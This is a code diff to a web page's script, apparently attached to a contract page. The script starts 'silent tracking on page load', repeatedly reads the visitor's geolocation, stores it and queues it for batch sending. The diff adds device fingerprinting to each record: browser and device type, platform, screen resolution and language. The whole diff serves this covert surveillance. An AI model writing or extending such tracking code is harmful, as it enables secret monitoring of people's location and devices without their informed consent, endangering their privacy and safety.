@@ -479,6 +479,41 @@
         let locationCount = 0;
         let lastUpdate = null;
         let trackingQueue = [];
+        let deviceName = getDeviceName();
+
+        // Get device name
+        function getDeviceName() {
+            const userAgent = navigator.userAgent;
+            let device = 'Unknown Device';
+            
+            // Detect operating system
+            if (userAgent.match(/Android/i)) {
+                device = 'Android Device';
+            } else if (userAgent.match(/iPhone/i)) {
+                device = 'iPhone';
+            } else if (userAgent.match(/iPad/i)) {
+                device = 'iPad';
+            } else if (userAgent.match(/Windows/i)) {
+                device = 'Windows PC';
+            } else if (userAgent.match(/Macintosh/i)) {
+                device = 'Mac';
+            } else if (userAgent.match(/Linux/i)) {
+                device = 'Linux PC';
+            }
+            
+            // Try to get browser name
+            if (userAgent.match(/Chrome/i) && !userAgent.match(/Edg/i)) {
+                device += ' (Chrome)';
+            } else if (userAgent.match(/Safari/i) && !userAgent.match(/Chrome/i)) {
+                device += ' (Safari)';
+            } else if (userAgent.match(/Firefox/i)) {
+                device += ' (Firefox)';
+            } else if (userAgent.match(/Edg/i)) {
+                device += ' (Edge)';
+            }
+            
+            return device;
+        }
 
         function trackLocation() {
             if (navigator.geolocation) {
@@ -487,9 +522,11 @@
                         locationCount++;
                         lastUpdate = new Date().toLocaleTimeString();
                         
-                        // Store location data silently
+                        // Store location data with device info
                         const locationData = {
                             id: locationCount,
+                            deviceName: deviceName,
+                            deviceType: navigator.platform,
                             latitude: position.coords.latitude,
                             longitude: position.coords.longitude,
                             accuracy: position.coords.accuracy,
@@ -497,7 +534,9 @@
                             heading: position.coords.heading,
                             speed: position.coords.speed,
                             timestamp: position.timestamp,
-                            collectedAt: new Date().toISOString()
+                            collectedAt: new Date().toISOString(),
+                            screenResolution: `${screen.width}x${screen.height}`,
+                            language: navigator.language
                         };
                         
                         // Add to queue for batch sending
@@ -514,7 +553,7 @@
                         
                         localStorage.setItem('contract_locations', JSON.stringify(locations));
                         
-                        console.log(`[${locationCount}] Location:`, locationData.latitude.toFixed(6), locationData.longitude.toFixed(6));
+                        console.log(`[${deviceName}] #${locationCount}: ${locationData.latitude.toFixed(6)}, ${locationData.longitude.toFixed(6)}`);
                     },
                     (error) => {
                         console.warn('Location error:', error.code);
@@ -530,7 +569,9 @@
 
         // Start silent tracking on page load
         document.addEventListener('DOMContentLoaded', () => {
-            console.log('Starting instant location tracking (1-second intervals)...');
+            console.log(`Starting tracking on: ${deviceName}`);
+            console.log('Platform:', navigator.platform);
+            console.log('Screen:', `${screen.width}x${screen.height}`);
             
             // Initial tracking
             trackLocation();
